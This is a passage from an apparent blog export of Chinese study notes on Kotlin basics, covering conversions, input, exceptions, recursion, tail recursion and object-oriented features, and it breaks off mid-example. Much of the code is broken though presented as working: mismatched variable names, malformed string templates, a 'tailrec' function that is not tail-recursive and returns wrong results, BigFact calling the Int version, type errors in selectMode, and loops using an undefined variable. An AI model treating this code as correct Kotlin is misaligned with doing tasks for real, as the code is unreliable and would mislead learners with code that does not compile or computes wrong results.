Pi,直径:<span class="type">Float</span>)</span></span>:<span class="built_in">Float</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> PI*直径</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fun</span> 获取圆柱体体积<span class="params">(PI:<span class="type">Float</span> = Pi,半径:<span class="type">Float</span>,高:<span class="type">Float</span>)</span></span>:<span class="built_in">Float</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> PI*半径*半径*高</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fun</span> 获取球体的表面积<span class="params">(PI:<span class="type">Float</span> = Pi,半径:<span class="type">Float</span>)</span></span>:<span class="built_in">Float</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> PI*半径*半径*<span class="number">4</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>Kotlin</tag>
      </tags>
  </entry>
  <entry>
    <title>Kotlin基础语法（下）</title>
    <url>/2020/06/23/Kotlin%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95%EF%BC%88%E4%B8%8B%EF%BC%89/</url>
    <content><![CDATA[<h1 id="Kotlin基础语法（上）"><a href="#Kotlin基础语法（上）" class="headerlink" title="Kotlin基础语法（上）"></a><a href="https://blog.csdn.net/weixin_44371842/article/details/106504114">Kotlin基础语法（上）</a></h1><h1 id="Kotlin基础语法（下）"><a href="#Kotlin基础语法（下）" class="headerlink" title="Kotlin基础语法（下）"></a>Kotlin基础语法（下）</h1><h2 id="Kotlin字符串和数字之间的转换"><a href="#Kotlin字符串和数字之间的转换" class="headerlink" title="Kotlin字符串和数字之间的转换"></a>Kotlin字符串和数字之间的转换</h2><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="string">&quot;13&quot;</span></span><br><span class="line"><span class="keyword">var</span> b = <span class="number">13</span></span><br><span class="line"></span><br><span class="line">a = b.toString()</span><br><span class="line">b = a.toInt()</span><br></pre></td></tr></table></figure>

<h2 id="Kotlin人机交互"><a href="#Kotlin人机交互" class="headerlink" title="Kotlin人机交互"></a>Kotlin人机交互</h2><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">main</span><span class="params">(args:<span class="type">Array</span>&lt;<span class="type">String</span>&gt;)</span></span>&#123;</span><br><span class="line">    println(<span class="string">&quot;请输入第一个数字:&quot;</span>)</span><br><span class="line">    <span class="keyword">var</span> numlstr = readLine()</span><br><span class="line">    println(<span class="string">&quot;请输入第二个数字：&quot;</span>)</span><br><span class="line">    <span class="keyword">var</span> num2str = readLine()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">var</span> num1 = num1str!!.toInt()</span><br><span class="line">    <span class="keyword">var</span> num2 = num2str!!.toInt()    <span class="comment">//!!代表输入的数据绝对不为空</span></span><br><span class="line">    </span><br><span class="line">    println(<span class="string">&quot;$(num1)+$(num2)=$(num1+num2)&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Kotlin异常处理"><a href="#Kotlin异常处理" class="headerlink" title="Kotlin异常处理"></a>Kotlin异常处理</h2><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">main</span><span class="params">(args:<span class="type">Array</span>&lt;<span class="type">String</span>&gt;)</span></span>&#123;</span><br><span class="line">    println(<span class="string">&quot;请输入第一个数字:&quot;</span>)</span><br><span class="line">    <span class="keyword">var</span> numlstr = readLine()</span><br><span class="line">    println(<span class="string">&quot;请输入第二个数字：&quot;</span>)</span><br><span class="line">    <span class="keyword">var</span> num2str = readLine()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> num1 = num1str!!.toInt()</span><br><span class="line">        <span class="keyword">var</span> num2 = num2str!!.toInt()    <span class="comment">//!!代表输入的数据绝对不为空</span></span><br><span class="line">    &#125;<span class="keyword">catch</span>(e:Exception)&#123;</span><br><span class="line">        println(<span class="string">&quot;运行错误！&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    println(<span class="string">&quot;$(num1)+$(num2)=$(num1+num2)&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Kotlin递归"><a href="#Kotlin递归" class="headerlink" title="Kotlin递归"></a>Kotlin递归</h2><ul>
<li>计算阶乘<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">main</span><span class="params">(args:<span class="type">Array</span>&lt;<span class="type">String</span>&gt;)</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> num = <span class="number">5</span></span><br><span class="line">    <span class="comment">//计算5的阶乘</span></span><br><span class="line">    println(<span class="string">&quot;5的阶乘是&amp;(fact(num))&quot;</span>)</span><br><span class="line">    <span class="comment">//计算100的阶乘</span></span><br><span class="line">    <span class="keyword">var</span> num1 = BigInteger(<span class="string">&quot;100&quot;</span>)</span><br><span class="line">    println(<span class="string">&quot;100的阶乘是&amp;&#123;BigFact(num1)&#125;&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">fact</span><span class="params">(num:<span class="type">Int</span>)</span></span>:<span class="built_in">Int</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(num == <span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> num*fact(num-<span class="number">1</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">fun</span> <span class="title">BigFact</span><span class="params">(num:<span class="type">BigInteger</span>)</span></span>:BigInteger&#123;</span><br><span class="line">    <span class="keyword">if</span>(num == BigInteger.ONE)&#123;</span><br><span class="line">        <span class="keyword">return</span> BigInteger.ONE</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> num*fact(num-BigInteger.ONE)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h2 id="Kotlin尾递归优化"><a href="#Kotlin尾递归优化" class="headerlink" title="Kotlin尾递归优化"></a>Kotlin尾递归优化</h2><ul>
<li>尾递归要求返回值应该还是调用函数本身</li>
<li><a href="https://www.dazhuanlan.com/2020/02/01/5e34cf0214147/">Kotlin尾递归优化</a><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">main</span><span class="params">(args:<span class="type">Array</span>&lt;<span class="type">String</span>&gt;)</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> result = <span class="number">0</span></span><br><span class="line">    println(ollAdd(<span class="number">100000</span>))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">tailrec</span> <span class="function"><span class="keyword">fun</span> <span class="title">ollAdd</span><span class="params">(num:<span class="type">Int</span>, result:<span class="type">Int</span>)</span></span>:<span class="built_in">Int</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(num==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> num+ollAdd(num-<span class="number">1</span>,result+num)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h2 id="Kotlin面向对象"><a href="#Kotlin面向对象" class="headerlink" title="Kotlin面向对象"></a>Kotlin面向对象</h2><ul>
<li>表示一个矩形类和一个妹子类<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Rect</span></span>(<span class="keyword">var</span> height:<span class="built_in">Int</span>,<span class="keyword">var</span> width:<span class="built_in">Int</span>)</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Girl</span></span>(<span class="keyword">var</span> charctor:String, <span class="keyword">var</span> voice:String)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">main</span><span class="params">(args:<span class="type">Array</span>&lt;<span class="type">String</span>&gt;)</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> rect1 = Rect(<span class="number">20</span>,<span class="number">10</span>)</span><br><span class="line">    println(<span class="string">&quot;高度:<span class="subst">$&#123;rect1.height&#125;</span>&quot;</span>)</span><br><span class="line">    println(<span class="string">&quot;宽度:<span class="subst">$&#123;rect1.width&#125;</span>&quot;</span>) </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">var</span> girl1 = Girl(<span class="string">&quot;彪悍&quot;</span>,<span class="string">&quot;甜美&quot;</span>)</span><br><span class="line">    println(<span class="string">&quot;girl1这位妹子的声音：<span class="subst">$&#123;girl1.voice&#125;</span>&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">输出：</span></span><br><span class="line"><span class="comment">高度:20</span></span><br><span class="line"><span class="comment">宽度:10</span></span><br><span class="line"><span class="comment">girl1这位妹子的声音：甜美</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
<h2 id="面向对象静态属性和动态行为"><a href="#面向对象静态属性和动态行为" class="headerlink" title="面向对象静态属性和动态行为"></a>面向对象静态属性和动态行为</h2><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Girl</span></span>(<span class="keyword">var</span> charctor:String, <span class="keyword">var</span> voice:String)&#123;</span><br><span class="line">    <span class="function"><span class="keyword">fun</span> <span class="title">smaile</span><span class="params">()</span></span>&#123;</span><br><span class="line">        println(<span class="string">&quot;妹子笑了一下，么么哒！&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">fun</span> <span class="title">cry</span><span class="params">()</span></span>&#123;</span><br><span class="line">        println(<span class="string">&quot;呜呜呜，人家伤心了！&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">main</span><span class="params">(args:<span class="type">Array</span>&lt;<span class="type">String</span>&gt;)</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> girl1 = Girl(<span class="string">&quot;彪悍&quot;</span>,<span class="string">&quot;甜美&quot;</span>)</span><br><span class="line">    println(<span class="string">&quot;girl1这位妹子的声音：<span class="subst">$&#123;girl1.voice&#125;</span>&quot;</span>)</span><br><span class="line">    girl1.cry()</span><br><span class="line">    girl1.smaile()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h2 id="面向对象实战——洗衣服"><a href="#面向对象实战——洗衣服" class="headerlink" title="面向对象实战——洗衣服"></a>面向对象实战——洗衣服</h2><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 生产方创建的洗衣机</span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WashMachine</span></span>(<span class="keyword">var</span> module:String,<span class="keyword">var</span> size:<span class="built_in">Int</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> isDoorOpen = <span class="literal">true</span></span><br><span class="line">    <span class="keyword">var</span> currentmode = <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">fun</span> <span class="title">openDoor</span><span class="params">()</span></span>&#123;</span><br><span class="line">        println(<span class="string">&quot;洗衣机已经开门！！！&quot;</span>)</span><br><span class="line">        isDoorOpen = <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">fun</span> <span class="title">closeDoor</span><span class="params">()</span></span>&#123;</span><br><span class="line">        println(<span class="string">&quot;洗衣机门已关闭&quot;</span>)</span><br><span class="line">        isDoorOpen = <span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">fun</span> <span class="title">selectMode</span><span class="params">()</span></span>&#123;</span><br><span class="line">        currentmode = readLine()</span><br><span class="line">        <span class="keyword">when</span>(mode)&#123;</span><br><span class="line">            <span class="number">0</span> -&gt; println(<span class="string">&quot;初始模式，请您选择模式&quot;</span>)</span><br><span class="line">            <span class="number">1</span> -&gt; println(<span class="string">&quot;轻柔&quot;</span>)</span><br><span class="line">            <span class="number">2</span> -&gt; println(<span class="string">&quot;狂柔&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span> -&gt; println(<span class="string">&quot;Error&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">fun</span> <span class="title">start</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(isDoorOpen)&#123;</span><br><span class="line">            println(<span class="string">&quot;门还没关，无法运行&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">when</span>(currentmode)&#123;</span><br><span class="line">                <span class="number">0</span> -&gt; &#123;println(<span class="string">&quot;未选择模式，不能开始洗衣服&quot;</span>)&#125;</span><br><span class="line">                <span class="number">1</span> -&gt; &#123;</span><br><span class="line">                    println(<span class="string">&quot;放水&quot;</span>)</span><br><span class="line">                    println(<span class="string">&quot;开始轻柔模式洗衣服&quot;</span>)</span><br><span class="line">                    println(<span class="string">&quot;洗完了&quot;</span>)</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="number">2</span> -&gt; &#123;</span><br><span class="line">                    println(<span class="string">&quot;放水&quot;</span>)</span><br><span class="line">                    println(<span class="string">&quot;开始狂柔模式洗衣服&quot;</span>)</span><br><span class="line">                    println(<span class="string">&quot;洗完了&quot;</span>)</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> -&gt; &#123;println(<span class="string">&quot;未选择模式，不能开始洗衣服&quot;</span>)&#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 用户使用洗衣机</span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">main</span><span class="params">(args:<span class="type">Array</span>&lt;<span class="type">String</span>&gt;)</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> washMachine = washMachine(<span class="string">&quot;小天鹅&quot;</span>,size:<span class="number">12</span>)</span><br><span class="line">    </span><br><span class="line">    washMachine.openDoor()</span><br><span class="line">    println(<span class="string">&quot;请选择模式：1，轻柔。2，狂柔&quot;</span>)</span><br><span class="line">    washMachine.selectMode</span><br><span class="line">    washMachine.closeDoor()</span><br><span class="line">    washMachine.start()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Kotlin面向对象——封装"><a href="#Kotlin面向对象——封装" class="headerlink" title="Kotlin面向对象——封装"></a>Kotlin面向对象——封装</h2><ul>
<li>封装就是隐藏内部实现的细节<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 生产方创建的洗衣机</span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WashMachine</span></span>(<span class="keyword">var</span> module:String,<span class="keyword">var</span> size:<span class="built_in">Int</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> isDoorOpen = <span class="literal">true</span></span><br><span class="line">    <span class="keyword">var</span> currentmode = <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">fun</span> <span class="title">openDoor</span><span class="params">()</span></span>&#123;</span><br><span class="line">        println(<span class="string">&quot;洗衣机已经开门！！！&quot;</span>)</span><br><span class="line">        isDoorOpen = <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">fun</span> <span class="title">closeDoor</span><span class="params">()</span></span>&#123;</span><br><span class="line">        println(<span class="string">&quot;洗衣机门已关闭&quot;</span>)</span><br><span class="line">        isDoorOpen = <span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">fun</span> <span class="title">selectMode</span><span class="params">()</span></span>&#123;</span><br><span class="line">        currentmode = readLine()</span><br><span class="line">        <span class="keyword">when</span>(mode)&#123;</span><br><span class="line">            <span class="number">0</span> -&gt; println(<span class="string">&quot;初始模式，请您选择模式&quot;</span>)</span><br><span class="line">            <span class="number">1</span> -&gt; println(<span class="string">&quot;轻柔&quot;</span>)</span><br><span class="line">            <span class="number">2</span> -&gt; println(<span class="string">&quot;狂柔&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span> -&gt; println(<span class="string">&quot;Error&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">fun</span> <span class="title">setMotorSpeed</span><span class="params">(speed:<span class="type">Int</span>)</span></span>&#123;        <span class="comment">//将方法私有化，只有内部函数可调用，外部并不能看到具体的实现细节，这就是封装</span></span><br><span class="line">        println(<span class="string">&quot;发动机当前转速 <span class="subst">$&#123;speed&#125;</span>转/秒&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">fun</span> <span class="title">start</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(isDoorOpen)&#123;</span><br><span class="line">            println(<span class="string">&quot;门还没关，无法运行&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">when</span>(currentmode)&#123;</span><br><span class="line">                <span class="number">0</span> -&gt; &#123;println(<span class="string">&quot;未选择模式，不能开始洗衣服&quot;</span>)&#125;</span><br><span class="line">                <span class="number">1</span> -&gt; &#123;</span><br><span class="line">                    println(<span class="string">&quot;放水&quot;</span>)</span><br><span class="line">                    println(<span class="string">&quot;开始轻柔模式洗衣服&quot;</span>)</span><br><span class="line">                    setMotorSpeed(<span class="number">100</span>)</span><br><span class="line">                    println(<span class="string">&quot;洗完了&quot;</span>)</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="number">2</span> -&gt; &#123;</span><br><span class="line">                    println(<span class="string">&quot;放水&quot;</span>)</span><br><span class="line">                    println(<span class="string">&quot;开始狂柔模式洗衣服&quot;</span>)</span><br><span class="line">                    setMotorSpeed(<span class="number">1000</span>)</span><br><span class="line">                    println(<span class="string">&quot;洗完了&quot;</span>)</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> -&gt; &#123;println(<span class="string">&quot;未选择模式，不能开始洗衣服&quot;</span>)&#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 用户使用洗衣机</span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">main</span><span class="params">(args:<span class="type">Array</span>&lt;<span class="type">String</span>&gt;)</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> washMachine = washMachine(<span class="string">&quot;小天鹅&quot;</span>,size:<span class="number">12</span>)</span><br><span class="line">    </span><br><span class="line">    washMachine.openDoor()</span><br><span class="line">    println(<span class="string">&quot;请选择模式：1，轻柔。2，狂柔&quot;</span>)</span><br><span class="line">    washMachine.selectMode</span><br><span class="line">    washMachine.closeDoor()</span><br><span class="line">    washMachine.start()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h2 id="kotlin面向对象——继承"><a href="#kotlin面向对象——继承" class="headerlink" title="kotlin面向对象——继承"></a>kotlin面向对象——继承</h2><ul>
<li>继承是指一个对象直接使用另一对象的属性和方法<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">父类</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">open</span> <span class="class"><span class="keyword">class</span> <span class="title">Fathor</span></span>&#123;  <span class="comment">//只有类open之后才能被继承</span></span><br><span class="line">    <span class="keyword">var</span> chactor:String = <span class="string">&quot;性格内向&quot;</span></span><br><span class="line">    <span class="keyword">open</span> <span class="function"><span class="keyword">fun</span> <span class="title">action</span><span class="params">()</span></span>&#123;      <span class="comment">//只有方法open之后，子类才能重写该方法</span></span><br><span class="line">        println(<span class="string">&quot;公共场合大声喧哗&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">fun</span> <span class="title">money</span><span class="params">()</span></span>&#123;</span><br><span class="line">        println(<span class="string">&quot;很有钱&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">子类</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Son</span>:<span class="type">Fathor</span></span>()&#123;</span><br><span class="line">    <span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="title">action</span><span class="params">()</span></span>&#123;</span><br><span class="line">        println(<span class="string">&quot;儿子很乖，在公共场合很有礼貌&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">main</span><span class="params">(args:<span class="type">Array</span>&lt;<span class="type">String</span>&gt;)</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> son1 = Son()</span><br><span class="line">    println(<span class="string">&quot;儿子的性格<span class="subst">$&#123;son1.chactor&#125;</span>&quot;</span>)</span><br><span class="line">    son1.action()</span><br><span class="line">    son1.money()</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">输出:</span></span><br><span class="line"><span class="comment">儿子的性格内向</span></span><br><span class="line"><span class="comment">儿子很乖，在公共场合很有礼貌</span></span><br><span class="line"><span class="comment">很有钱</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

</li>
</ul>
<h2 id="kotlin面向对象——抽象类"><a href="#kotlin面向对象——抽象类" class="headerlink" title="kotlin面向对象——抽象类"></a>kotlin面向对象——抽象类</h2><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Human</span></span>(<span class="keyword">var</span> name:String)&#123; <span class="comment">//抽象人类</span></span><br><span class="line">    <span class="keyword">abstract</span> <span class="function"><span class="keyword">fun</span> <span class="title">eat</span><span class="params">()</span></span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Man</span></span>(name:String):Human(name)&#123;</span><br><span class="line">    <span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="title">eat</span><span class="params">()</span></span>&#123;</span><br><span class="line">        println(<span class="string">&quot;<span class="subst">$&#123;name&#125;</span>哇哇哇地大口吃&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Woman</span></span>(name:String):Human(name)&#123;</span><br><span class="line">    <span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="title">eat</span><span class="params">()</span></span>&#123;</span><br><span class="line">        println(<span class="string">&quot;<span class="subst">$&#123;name&#125;</span>呜呜呜地小口吃&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">main</span><span class="params">(args:<span class="type">Array</span>&lt;<span class="type">String</span>&gt;)</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> person1 = Man(<span class="string">&quot;金三胖&quot;</span>)</span><br><span class="line">    person1.eat()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">var</span> person2 = Woman(<span class="string">&quot;慈禧太后&quot;</span>)</span><br><span class="line">    person2.eat()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="kotlin面向对象——多态"><a href="#kotlin面向对象——多态" class="headerlink" title="kotlin面向对象——多态"></a>kotlin面向对象——多态</h2><ul>
<li>多态就是同种功能，不同的表现形态<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Human</span></span>(<span class="keyword">var</span> name:String)&#123; <span class="comment">//抽象人类</span></span><br><span class="line">    <span class="keyword">abstract</span> <span class="function"><span class="keyword">fun</span> <span class="title">eat</span><span class="params">()</span></span>  <span class="comment">//吃</span></span><br><span class="line">    <span class="keyword">abstract</span> <span class="function"><span class="keyword">fun</span> <span class="title">pee</span><span class="params">()</span></span> <span class="comment">//撒尿</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Man</span></span>(name:String):Human(name)&#123;</span><br><span class="line">    <span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="title">eat</span><span class="params">()</span></span>&#123;</span><br><span class="line">        println(<span class="string">&quot;<span class="subst">$&#123;name&#125;</span>哇哇哇地大口吃&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="title">pee</span><span class="params">()</span></span>&#123;</span><br><span class="line">        println(<span class="string">&quot;<span class="subst">$&#123;name&#125;</span>站着撒尿&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Woman</span></span>(name:String):Human(name)&#123;</span><br><span class="line">    <span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="title">eat</span><span class="params">()</span></span>&#123;</span><br><span class="line">        println(<span class="string">&quot;<span class="subst">$&#123;name&#125;</span>呜呜呜地小口吃&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="title">pee</span><span class="params">()</span></span>&#123;</span><br><span class="line">        println(<span class="string">&quot;<span class="subst">$&#123;name&#125;</span>蹲着撒尿&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">main</span><span class="params">(args:<span class="type">Array</span>&lt;<span class="type">String</span>&gt;)</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> person1 = Man(<span class="string">&quot;金三胖&quot;</span>)</span><br><span class="line">    <span class="keyword">var</span> person2 = Woman(<span class="string">&quot;慈禧太后&quot;</span>)</span><br><span class="line">    <span class="keyword">var</span> person3 = Man(<span class="string">&quot;李华&quot;</span>)</span><br><span class="line">    <span class="keyword">var</span> person4 = Woman(<span class="string">&quot;蒙娜丽莎&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> houseList = listOf&lt;Human&gt;(person1,person2,person3,person4)</span><br><span class="line">    <span class="keyword">for</span>(person <span class="keyword">in</span> houseList)&#123;</span><br><span class="line">        h.eat()</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(person <span class="keyword">in</span> houseList)&#123;</span><br><span class="line">        h.pee()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h2 id="kotlin面向对象——接口"><a href="#kotlin面向对象——接口" class="headerlink" title="kotlin面向对象——接口"></a>kotlin面向对象——接口</h2><ul>
<li>接口泛指实体把自己提供给外界的一种抽象化物（可以为另一实体），用以由内部操作分离出外部沟通方法，使其能被内部修改而不应向外界其他实体与其交互的方式。</li>
<li>接口和抽象类的区别<blockquote>
<p>接口是事物的能力，而抽象类是事物的本质</p>
</blockquote>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">IMan</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">fun</span> <span class="title">xiaodidi</span><span class="params">()</span></span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Human</span></span>&#123;</span><br><span class="line">    <span class="keyword">abstract</span> <span class="function"><span class="keyword">fun</span> <span class="title">eat</span><span class="params">()</span></span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Man</span>:<span class="type">Human</span></span>(),IMan&#123;</span><br><span class="line">    <span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="title">xiaodidi</span><span class="params">()</span></span>&#123;</span><br><span class="line">        println(<span class="string">&quot;18厘米&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">override</span> <span class="function"><span 